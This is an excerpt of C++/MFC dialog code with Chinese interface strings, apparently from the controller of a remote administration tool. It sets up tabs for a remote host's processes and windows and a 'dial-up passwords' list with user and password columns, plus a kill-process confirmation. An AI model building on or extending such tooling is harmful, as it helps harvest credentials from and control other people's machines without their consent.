...
BOOL CSystemDlg::OnInitDialog() 
{
	...
	str.Format("\\\\%s - 系統管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	

	m_tab.InsertItem(0, "進程管理");
	m_tab.InsertItem(1, "窗口管理");
	m_tab.InsertItem(2, "撥號密碼");

	m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_process.InsertColumn(0, "映像名稱", LVCFMT_LEFT, 100);
	m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_list_process.InsertColumn(2, "程序路徑", LVCFMT_LEFT, 400);

	m_list_windows.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_windows.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
	m_list_windows.InsertColumn(1, "窗口名稱", LVCFMT_LEFT, 300);

	m_list_dialupass.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list_dialupass.InsertColumn(0, "名稱", LVCFMT_LEFT, 50);
	m_list_dialupass.InsertColumn(1, "用戶", LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(2, "密碼", LVCFMT_LEFT, 75);
	m_list_dialupass.InsertColumn(3, "電話/主機", LVCFMT_LEFT, 102);
	m_list_dialupass.InsertColumn(5, "設備", LVCFMT_LEFT, 105);
...
void CSystemDlg::OnKillprocess() 
{
	...
	char *lpTips = "警告: 終止進程會導致不希望發生的結果，\n"
		"包括數據丟失和系統不穩定。在被終止前，\n"
		"進程將沒有機會保存其狀態和數據。";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%s確實\n想終止這%d項進程嗎?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%s確實\n想終止該項進程嗎?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "進程結束警告", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
